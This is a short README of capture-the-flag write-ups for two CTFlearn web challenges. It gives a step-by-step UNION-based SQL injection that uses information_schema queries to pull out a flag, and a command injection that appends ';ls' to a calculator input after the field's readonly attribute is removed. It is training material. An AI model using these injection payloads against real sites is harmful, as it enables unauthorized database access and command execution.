# CTFs-Writeups---CTFlearn
CTFs Writeups - CTFlearn

Inj3ction Time 
"I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command"

"1 OR 1=1" give us a few results but nothing we are interested in. 
Take into account the advice we started to look for the number of colums : "1 UNION SELECT 1,2" ; "1 UNION SELECT 1,2,3" ; "1 UNION SELECT 1,2,3,4" : Bingo
We then try to use "UNION SELECT 1,2,3,4 FROM information_schema.tables" but it doesn't give us any result
We then try : "1 UNION SELECT table_name,2,3,4 FROM information_schema.tables" 
Effectively finding the following flag : "w0w_y0u_f0und_m3"
We then swtich our injection to find all colums names : "1 UNION SELECT column_name,2,3,4 FROM information_schema.columns" giving us : "f0und_m3"
We then use the column name and the table name we found with a UNION injection : "1 UNION SELECT f0und_m3,2,3,4 FROM w0w_y0u_f0und_m3" effectively grabbing the full flag : abctf{uni0n_1s_4_gr34t_c0mm4nd}

Writed by : Cloclodudu & Asch-sys




Calculat3 M3 
Here! http://web.ctflearn.com/web7/ I forget how we were doing those calculations, but something tells me it was pretty insecure.

The site display a calculator, by opening the html with f12 we are able to see that the input has a read only tag. We remove it and try to input ;ls to get the names of the files which works and get us the flag : {watch_0ut_f0r_th3_m0ng00s3}

Writed by : Cloclodudu & Asch-sys



